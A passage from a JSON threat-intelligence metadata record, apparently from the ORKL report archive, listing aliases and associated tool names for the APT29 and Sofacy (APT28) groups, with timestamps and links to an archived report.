                "EuroAPT",
                "FatDuke",
                "FoggyWeb",
                "GeminiDuke",
                "Geppei",
                "GoldFinder",
                "GoldMax",
                "GraphDrop",
                "GraphicalNeutrino",
                "GraphicalProton",
                "HAMMERTOSS",
                "HammerDuke",
                "LOLBAS",
                "LOLBins",
                "LiteDuke",
                "Living off the Land",
                "MagicWeb",
                "Mimikatz",
                "MiniDionis",
                "MiniDuke",
                "NemesisGemina",
                "NetDuke",
                "OnionDuke",
                "POSHSPY",
                "PinchDuke",
                "PolyglotDuke",
                "PowerDuke",
                "QUIETEXIT",
                "ROOTSAW",
                "RegDuke",
                "Rubeus",
                "SNOWYAMBER",
                "SPICYBEAT",
                "SUNSHUTTLE",
                "SeaDaddy",
                "SeaDask",
                "SeaDesk",
                "SeaDuke",
                "Sharp-SMBExec",
                "SharpView",
                "Sibot",
                "Solorigate",
                "SoreFang",
                "TinyBaron",
                "WINELOADER",
                "WellMail",
                "WellMess",
                "cobeacon",
                "elf.wellmess",
                "reGeorg",
                "tDiscoverer"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "46b3c0fc-fa0c-4d63-a38a-b33a524561fb",
            "created_at": "2023-01-06T13:46:38.393409Z",
            "updated_at": "2024-11-22T02:00:02.469929Z",
            "deleted_at": null,
            "main_name": "APT29",
            "aliases": [
                "TA421",
                "ITG11",
                "BlueBravo",
                "Nobelium",
                "The Dukes",
                "SeaDuke",
                "Grizzly Steppe",
                "Cloaked Ursa",
                "Group 100",
                "YTTRIUM",
                "IRON HEMLOCK",
                "G0016",
                "Blue Kitsune",
                "UAC-0029",
                "COZY BEAR",
                "Minidionis",
                "ATK7"
            ],
            "source_name": "MISPGALAXY:APT29",
            "tools": [
                "QUARTERRIG",
                "SNOWYAMBER",
                "HALFRIG"
            ],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "d2516b8e-e74f-490d-8a15-43ad6763c7ab",
            "created_at": "2022-10-25T16:07:24.212584Z",
            "updated_at": "2024-11-22T02:02:01.181291Z",
            "deleted_at": null,
            "main_name": "Sofacy",
            "aliases": [
                "APT 28",
                "ATK 5",
                "Blue Athena",
                "BlueDelta",
                "FROZENLAKE",
                "Fancy Bear",
                "Fighting Ursa",
                "Forest Blizzard",
                "Grey-Cloud",
                "Grizzly Steppe",
                "Group 74",
                "ITG05",
                "Iron Twilight",
                "Operation DealersChoice",
                "Operation Dear Joohn",
                "Operation Komplex",
                "Operation Pawn Storm",
                "Operation Russian Doll",
                "Operation Steal-It",
                "Pawn Storm",
                "SIG40",
                "Sednit",
                "Snakemackerel",
                "Sofacy",
                "Strontium",
                "T-APT-12",
                "TA422",
                "TAG-0700",
                "TG-4127",
                "Tsar Team",
                "UAC-0028",
                "UAC-0063"
            ],
            "source_name": "ETDA:Sofacy",
            "tools": [
                "ADVSTORESHELL",
                "AZZY",
                "Backdoor.SofacyX",
                "CHERRYSPY",
                "CORESHELL",
                "Carberp",
                "Computrace",
                "DealersChoice",
                "Delphacy",
                "Downdelph",
                "Downrage",
                "Drovorub",
                "EVILTOSS",
                "Foozer",
                "GAMEFISH",
                "GooseEgg",
                "Graphite",
                "HATVIBE",
                "HIDEDRV",
                "Headlace",
                "Impacket",
                "JHUHUGIT",
                "JKEYSKW",
                "Koadic",
                "Komplex",
                "LOLBAS",
                "LOLBins",
                "Living off the Land",
                "LoJack",
                "LoJax",
                "MASEPIE",
                "Mimikatz",
                "NETUI",
                "Nimcy",
                "OCEANMAP",
                "OLDBAIT",
                "PocoDown",
                "PocoDownloader",
                "Popr-d30",
                "ProcDump",
                "PythocyDbg",
                "SMBExec",
                "SOURFACE",
                "SPLM",
                "STEELHOOK",
                "Sasfis",
                "Sedkit",
                "Sednit",
                "Sedreco",
                "Seduploader",
                "Shunnael",
                "SkinnyBoy",
                "Sofacy",
                "SofacyCarberp",
                "SpiderLabs Responder",
                "Trojan.Shunnael",
                "Trojan.Sofacy",
                "USB Stealer",
                "USBStealer",
                "VPNFilter",
                "Win32/USBStealer",
                "WinIDS",
                "Winexe",
                "X-Agent",
                "X-Tunnel",
                "XAPS",
                "XTunnel",
                "Xagent",
                "Zebrocy",
                "Zekapab",
                "carberplike",
                "certutil",
                "certutil.exe",
                "fysbis",
                "webhp"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1703124257910,
    "ts_updated_at": 1732241003766,
    "ts_creation_date": 1702477056000,
    "ts_modification_date": 1702477065000,
    "files": {
        "pdf": "https://archive.orkl.eu/443181071d70821ccd4f78533f8b6b9947dc4b46.pdf",
        "text": "https://archive.orkl.eu/443181071d70821ccd4f78533f8b6b9947dc4b46.txt",
        "img": "https://archive.orkl.eu/443181071d70821ccd4f78533f8b6b9947dc4b46.jpg"
    }
}